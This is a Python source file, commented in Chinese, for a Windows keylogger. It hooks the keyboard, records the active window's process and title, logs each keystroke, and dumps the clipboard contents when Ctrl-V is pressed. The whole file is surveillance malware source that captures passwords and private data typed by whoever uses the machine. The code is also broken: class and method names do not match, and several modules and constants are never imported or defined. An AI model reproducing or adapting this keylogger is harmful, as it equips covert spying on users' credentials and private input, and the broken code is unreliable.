import sys
from ctypes import byref,create_string_buffer,c_ulong,windll
import win32clipboard
from io import StringIO
import pyWinhook as pyHook



class keyLogger():
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        # 获取前台窗口句柄
        hwnd = windll.user32.GetForegroundWindow()
        # 获取进程id
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd,byref(pid))
        # 报错当前的进程id
        process_id = f"{pid.value}"
        # 申请内存
        executable = create_string_buffer(512)
        # 打开进程
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        # 读取窗口标题
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        # 输出相关信息
        try:
            self.current_window = window_title.value.decode('unicode_escape')
        except UnicodeDecodeError as e:
            print(f"{e}:window name unknow")
        print("\n", process_id, executable.value.decode('unicode_escape'), self.current_window)

        # 关闭句柄
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)


    def ketstore(self,event):
        # 检测目标是否切换了窗口
        if event.WindowName != self.current_window:
            self.get_current_process()

        # 检测按键是否为常规按键
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end="")
        else:
            # 如果输入为Ctrl-V ,则获得剪贴板内容
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f"[PASTE] - {value}")
            else:
                print(f"{event.Key}")
            return True

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()
    # 创建和注册钩子函数
    k1 = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = k1.mykeystore
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == "__main__":
    print(run())
    print("done.")